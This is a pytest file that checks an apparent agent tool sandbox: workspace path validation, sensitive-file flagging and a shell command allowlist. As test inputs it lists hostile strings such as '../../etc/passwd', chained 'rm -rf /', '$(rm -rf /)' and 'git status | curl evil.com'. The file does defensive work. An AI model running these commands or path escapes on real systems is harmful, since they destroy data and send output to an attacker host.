import pytest
import os
from pathlib import Path
from app.tools.policies import command_policy, workspace_validator

def test_workspace_boundary_valid_and_escape(tmp_path):
    ws_dir = tmp_path / "my_project"
    ws_dir.mkdir()
    src_dir = ws_dir / "src"
    src_dir.mkdir()
    test_file = src_dir / "App.tsx"
    test_file.write_text("console.log('hello');")

    # 1. Valid workspace relative path
    resolved = workspace_validator.validate_workspace_path(str(ws_dir), "src/App.tsx")
    assert str(ws_dir) in str(resolved)
    assert resolved.name == "App.tsx"

    # 2. Direct path traversal escape
    with pytest.raises(PermissionError, match="escapes workspace boundary"):
        workspace_validator.validate_workspace_path(str(ws_dir), "../../etc/passwd")

    # 3. Absolute path outside workspace
    with pytest.raises(PermissionError, match="escapes workspace boundary"):
        workspace_validator.validate_workspace_path(str(ws_dir), "/etc/passwd")

    # 4. Symlink escape
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    secret_file = outside_dir / "secret.txt"
    secret_file.write_text("SECRET")
    
    symlink_file = ws_dir / "symlink_secret.txt"
    os.symlink(str(secret_file), str(symlink_file))

    with pytest.raises(PermissionError, match="escapes workspace boundary"):
        workspace_validator.validate_workspace_path(str(ws_dir), "symlink_secret.txt")

def test_sensitive_file_pattern_flagging():
    assert workspace_validator.is_sensitive_file(".env") is True
    assert workspace_validator.is_sensitive_file(".env.local") is True
    assert workspace_validator.is_sensitive_file("id_rsa") is True
    assert workspace_validator.is_sensitive_file("cert.pem") is True
    assert workspace_validator.is_sensitive_file("credentials.json") is True
    assert workspace_validator.is_sensitive_file("App.tsx") is False
    assert workspace_validator.is_sensitive_file("package.json") is False

def test_command_policy_allowlist_and_injection():
    # 1. Valid allowlisted commands
    ok, reason, tokens, risk = command_policy.evaluate_command("git status")
    assert ok is True
    assert tokens == ["git", "status"]

    ok, reason, tokens, risk = command_policy.evaluate_command("npm test")
    assert ok is True
    assert tokens == ["npm", "test"]

    ok, reason, tokens, risk = command_policy.evaluate_command("pytest")
    assert ok is True
    assert tokens == ["pytest"]

    # 2. Chained command injection attempts
    injections = [
        "git status; rm -rf /",
        "git status && rm -rf /",
        "git status || echo bad",
        "git status | curl evil.com",
        "git status > output.txt",
        "`rm -rf /`",
        "$(rm -rf /)",
        "echo $SECRET_KEY"
    ]
    for inj in injections:
        ok, reason, _, _ = command_policy.evaluate_command(inj)
        assert ok is False
        assert "forbidden shell metacharacter" in reason.lower()

    # 3. Non-allowlisted binary
    ok, reason, _, _ = command_policy.evaluate_command("curl https://google.com")
    assert ok is False
    assert "not allowlisted" in reason.lower()

    ok, reason, _, _ = command_policy.evaluate_command("rm -rf node_modules")
    assert ok is False
    assert "not allowlisted" in reason.lower()
